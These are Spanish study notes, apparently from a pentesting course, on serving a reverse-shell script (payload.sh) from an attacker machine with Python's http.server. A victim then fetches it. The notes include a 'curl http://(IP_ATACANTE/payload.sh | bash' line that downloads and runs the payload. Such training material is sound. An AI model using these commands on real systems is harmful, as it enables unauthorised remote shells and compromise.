- Vamos a crear una pagina web usando Python para traspasarnos archivos de la maquina victima  a la atacante.


- Vamos a crear un `payload.sh` con `nano`.
- Vamos a escribir una reverse shell
![](../Imagenes/Pasted%20image%2020241211185224.png)
==Se usa .sh (Script de shell) porque son ampliamente compatibles con sistemas Unix y Linux==
- Guardamos.
- Ahora, como podemos compartir este archivo con la maquina victima?
- Usamos el comando:
```
python3 -m http.server 80
```
- Esto levanta una pagina por el puerto 80 que nos permitirá ingresar y descargar lo que subamos a esta pagina.
![](../Imagenes/Pasted%20image%2020241211185936.png)
- Ingresamos la IP en el buscador de internet de la maquina victima y ya estaríamos viendo el archivo que creamos.
![](../Imagenes/Pasted%20image%2020241211194226.png)
- Lo podemos descargar

- También tenemos otra forma de como ejecutarlo usando la terminal de la maquina victima, y es con el siguiente comando:
```
curl http://(IP_ATACANTE/payload.sh | bash
```
- Ponemos la IP de la maquina atacante seguido del nombre del archivo.
- Nos mantenemos en escucha desde la maquina atacante y ejecutamos el comando desde la maquina victima.